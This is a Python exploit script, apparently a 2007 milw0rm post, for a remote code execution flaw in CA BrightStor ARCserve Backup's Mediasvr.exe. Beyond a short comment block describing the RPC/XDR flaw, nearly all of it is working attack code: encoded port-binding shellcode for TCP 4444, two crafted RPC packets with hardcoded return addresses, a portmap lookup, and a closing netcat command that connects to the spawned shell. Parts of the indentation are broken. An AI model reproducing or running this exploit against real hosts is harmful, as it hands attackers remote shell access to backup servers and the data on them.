#!/usr/bin/python
#
# Computer Associates (CA) Brightstor Backup Mediasvr.exe Remote Code Exploit
# (Previously Unknown)
#
# There seems to be an design error in the handling of RPC data with xdr procedures
# across several .dll's imported by Mediasvr.exe. Four bytes from an RPC packet are
# processed as a particular address (xdr_handle_t data which is run through multiple bit
# shifts, and reversing of bytes), and eventually loaded into ECX.
#
# The 191 (0xbf) procedure, followed by nulls (at least 8 bytes of nulls, which may
# be Null Credentials and Auth?) leads to an exploitable condition.
#
# .text:0040AACD 008                 mov     ecx, [esp+8]
# .text:0040AAD1 008                 mov     dword_418820, esi
# .text:0040AAD7 008                 push    offset dword_418820
# .text:0040AADC 00C                 mov     eax, [ecx]
# .text:0040AADE 00C                 call    dword ptr [eax+2Ch]
#
# At this point, you have control of ECX (esp+8 is your address data). The data from the packet
# is stored in memory and is relatively static (see NOTE).
#
# The address is then loaded into EAX, and then called as EAX+2Ch, which is
# controllable data from the packet. In this code, I just jump ahead to
# the portbinding shellcode.
#
# NOTE: The only issue I have found is when the system is rebooted, the packet data
# appears at a higher memory location when Mediasvr.exe crashes
# and is restarted. I have accounted for this in the code, when the port that
# Mediasvr.exe is listening on is below TCP port 1100, which is usually only after
# a reboot
#
# This was tested on BrightStor ARCserve Backup 11.5.2.0 (SP2) with the latest
# CA patches on Windows XP SP2 (I believe there is some issue with SP1, which
# is more then likely the memory locations)
#
# The patches include the following updates to Mediasvr.exe
# http://supportconnectw.ca.com/public/storage/infodocs/babimpsec-notice.asp
#
# CA has been notified
#
# Author: M. Shirk
# Tester: Tebodell
#
# (c) Copyright 2007 (Shirkdog Security) shirkdog_list $ at % hotmail dot com
#
# Use at your own Risk: You have been warned
#------------------------------------------------------------------------

import os
import sys
import time
import socket
import struct

#------------------------------------------------------------------------

#Portbind shellcode; Binds shell on TCP port 4444
shellcode  = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
shellcode += "\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
shellcode += "\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
shellcode += "\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
shellcode += "\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x36\x4b\x4e"
shellcode += "\x4d\x34\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x46\x4b\x58"
shellcode += "\x4e\x56\x46\x42\x46\x42\x4b\x58\x45\x54\x4e\x53\x4b\x48\x4e\x57"
shellcode += "\x45\x30\x4a\x47\x41\x30\x4f\x4e\x4b\x48\x4f\x44\x4a\x51\x4b\x38"
shellcode += "\x4f\x55\x42\x32\x41\x50\x4b\x4e\x49\x44\x4b\x58\x46\x33\x4b\x58"
shellcode += "\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x49\x4e\x4a\x46\x48\x42\x4c"
shellcode += "\x46\x37\x47\x30\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"
shellcode += "\x46\x4f\x4b\x53\x46\x35\x46\x52\x4a\x42\x45\x57\x45\x4e\x4b\x48"
shellcode += "\x4f\x45\x46\x52\x41\x30\x4b\x4e\x48\x46\x4b\x38\x4e\x50\x4b\x54"
shellcode += "\x4b\x48\x4f\x45\x4e\x41\x41\x30\x4b\x4e\x43\x30\x4e\x32\x4b\x58"
shellcode += "\x49\x48\x4e\x36\x46\x42\x4e\x41\x41\x56\x43\x4c\x41\x53\x4b\x4d"
shellcode += "\x46\x56\x4b\x38\x43\x54\x42\x43\x4b\x58\x42\x44\x4e\x30\x4b\x38"
shellcode += "\x42\x47\x4e\x41\x4d\x4a\x4b\x58\x42\x44\x4a\x30\x50\x55\x4a\x56"
shellcode += "\x50\x48\x50\x34\x50\x30\x4e\x4e\x42\x45\x4f\x4f\x48\x4d\x48\x36"
shellcode += "\x43\x45\x48\x56\x4a\x46\x43\x53\x44\x33\x4a\x46\x47\x37\x43\x57"
shellcode += "\x44\x33\x4f\x35\x46\x35\x4f\x4f\x42\x4d\x4a\x36\x4b\x4c\x4d\x4e"
shellcode += "\x4e\x4f\x4b\x53\x42\x45\x4f\x4f\x48\x4d\x4f\x35\x49\x38\x45\x4e"
shellcode += "\x48\x46\x41\x58\x4d\x4e\x4a\x30\x44\x30\x45\x35\x4c\x36\x44\x30"
shellcode += "\x4f\x4f\x42\x4d\x4a\x46\x49\x4d\x49\x50\x45\x4f\x4d\x4a\x47\x35"
shellcode += "\x4f\x4f\x48\x4d\x43\x35\x43\x45\x43\x55\x43\x45\x43\x35\x43\x34"
shellcode += "\x43\x55\x43\x34\x43\x45\x4f\x4f\x42\x4d\x48\x46\x4a\x36\x41\x41"
shellcode += "\x4e\x45\x48\x36\x43\x45\x49\x58\x41\x4e\x45\x39\x4a\x56\x46\x4a"
shellcode += "\x4c\x31\x42\x37\x47\x4c\x47\x45\x4f\x4f\x48\x4d\x4c\x46\x42\x31"
shellcode += "\x41\x55\x45\x55\x4f\x4f\x42\x4d\x4a\x36\x46\x4a\x4d\x4a\x50\x42"
shellcode += "\x49\x4e\x47\x45\x4f\x4f\x48\x4d\x43\x55\x45\x35\x4f\x4f\x42\x4d"
shellcode += "\x4a\x36\x45\x4e\x49\x54\x48\x58\x49\x44\x47\x55\x4f\x4f\x48\x4d"
shellcode += "\x42\x55\x46\x35\x46\x35\x45\x35\x4f\x4f\x42\x4d\x43\x39\x4a\x56"
shellcode += "\x47\x4e\x49\x47\x48\x4c\x49\x37\x47\x45\x4f\x4f\x48\x4d\x45\x45"
shellcode += "\x4f\x4f\x42\x4d\x48\x46\x4c\x36\x46\x56\x48\x36\x4a\x46\x43\x46"
shellcode += "\x4d\x46\x49\x58\x45\x4e\x4c\x56\x42\x35\x49\x55\x49\x52\x4e\x4c"
shellcode += "\x49\x38\x47\x4e\x4c\x56\x46\x54\x49\x58\x44\x4e\x41\x53\x42\x4c"
shellcode += "\x43\x4f\x4c\x4a\x50\x4f\x44\x54\x4d\x52\x50\x4f\x44\x34\x4e\x32"
shellcode += "\x43\x49\x4d\x48\x4c\x47\x4a\x33\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x36"
shellcode += "\x44\x47\x50\x4f\x43\x4b\x48\x41\x4f\x4f\x45\x57\x46\x34\x4f\x4f"
shellcode += "\x48\x4d\x4b\x45\x47\x55\x44\x55\x41\x45\x41\x35\x41\x55\x4c\x36"
shellcode += "\x41\x30\x41\x35\x41\x55\x45\x45\x41\x45\x4f\x4f\x42\x4d\x4a\x56"
shellcode += "\x4d\x4a\x49\x4d\x45\x30\x50\x4c\x43\x35\x4f\x4f\x48\x4d\x4c\x56"
shellcode += "\x4f\x4f\x4f\x4f\x47\x33\x4f\x4f\x42\x4d\x4b\x38\x47\x55\x4e\x4f"
shellcode += "\x43\x48\x46\x4c\x46\x36\x4f\x4f\x48\x4d\x44\x55\x4f\x4f\x42\x4d"
shellcode += "\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x45\x43\x55\x4f\x4f\x48\x4d"
shellcode += "\x4f\x4f\x42\x4d\x5a\x90"

#------------------------------------------------------------------------

#First Packet
rpc_packet1="\x80\x00\x80\x34\x65\xcf\x4c\x7b\x00\x00\x00\x00\x00\x00\x00"
rpc_packet1+="\x02\x00\x06\x09\x7e\x00\x00\x00\x01"

#Prodcedure 191 and nulls
rpc_packet1+="\x00\x00\x00\xbf\x00\x00\x00\x00\x00\x00\x00\x00"

#Apparently these 4 bytes can be anything
rpc_packet1+="\x00\x00\x00\x00"

#This value is important for the location of the next address
rpc_packet1+="\x00\x00\x00\x00"

#Hardcoded Address loaded into ECX
rpc_packet1+="\x00\xae\x27\x64"

#Just spacing
rpc_packet1+="\x41\x42\x43\x44"

#Addess in memory, loaded into EAX and called with EAX+2Ch to get to shellcode
rpc_packet1+="\x3c\x27\xae\x00"

#jump to shellcode for packet 1
rpc_packet1+="\x6c\x27\xae\x00"
rpc_packet1+="\xeb\x01"
rpc_packet1+=shellcode

#------------------------------------------------------------------------

#Second Packet
rpc_packet2="\x80\x00\x80\x34\x65\xcf\x4c\x7b\x00\x00\x00\x00\x00\x00\x00"
rpc_packet2+="\x02\x00\x06\x09\x7e\x00\x00\x00\x01"

#Procedure 191 and nulls
rpc_packet2+="\x00\x00\x00\xbf\x00\x00\x00\x00\x00\x00\x00\x00"

#Apparently these 4 bytes can be anything
rpc_packet2+="\x00\x00\x00\x00"

#This value is important for the location of the next address
rpc_packet2+="\x00\x00\x00\x00"

#Hardcoded Address loaded into ECX that seems to be hit after Mediasvr.exe has been
#restarted
rpc_packet2+="\x00\x9e\x27\x64"

#Just spacing
rpc_packet2+="\x41\x42\x43\x44"

#Addess stored in memory, loaded into EAX and called with EAX+2Ch to get to shellcode
rpc_packet2+="\x3c\x27\x9e\x00"

#jump to shellcode for packet 2
rpc_packet2+="\x6c\x27\x9e\x00"
rpc_packet2+="\xeb\x01"
rpc_packet2+=shellcode

# Portmap request for Mediasvr.exe
rpc_portmap_req="\x80\x00\x00\x38\x21\x84\xf7\xc9\x00\x00\x00\x00\x00\x00\x00"
rpc_portmap_req+="\x02\x00\x01\x86\xa0\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00"
rpc_portmap_req+="\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
rpc_portmap_req+="\x06\x09\x7e\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x00"

#------------------------------------------------------------------------

def GetMediaSvrPort(target):
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((target,111))
    sock.send(rpc_portmap_req)
    rec = sock.recv(256)
    sock.close()

    port1 = rec[-4]
    port2 = rec[-3]
    port3 = rec[-2]
    port4 = rec[-1]   
   
    port1 = hex(ord(port1))
    port2 = hex(ord(port2))
    port3 = hex(ord(port3))
    port4 = hex(ord(port4))
    port = '%02x%02x%02x%02x' % (int(port1,16),int(port2,16),int(port3,16),int(port4,16))
   
    port = int(port,16)
    if port < 1100:
        print '[+] Fresh Meat: Mediasvr.exe has not been restarted, Sending Packet 1 to: Target: %s Port: %s' %(target,port)
        ExploitMediaSvr(target,port,1)
    else:
        print '[+] Mediasvr.exe has been restarted, Sending Packet 2 to: Target: %s Port: %s' % (target,port)
        ExploitMediaSvr(target,port,2)

def ExploitMediaSvr(target,port,p):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target, port))
    if p == 1:
        sock.send(rpc_packet1)    
    elif p == 2:
        sock.send(rpc_packet2)
       sock.close ()


if __name__=="__main__":
       try:
               target = sys.argv[1]
       except IndexError:
        print '[+] Computer Associates (CA) Brightstor Backup Mediasvr.exe Remote Exploit'
               print '[+] Author: Shirkdog'
                   print '[+] Usage: %s <target ip>\n' % sys.argv[0]
                   sys.exit(-1)

       print '[+] Computer Associates (CA) Brightstor Backup Mediasvr.exe Remote Exploit'
       print '[+] Author: Shirkdog'

       GetMediaSvrPort(target)
           
       print '[+] Exploit sent. Using nc to connect to: %s on port 4444' % target
       time.sleep(3)
       connect = "/usr/bin/nc -vn " + target + " 4444"
       os.system(connect)

# milw0rm.com [2007-03-29]
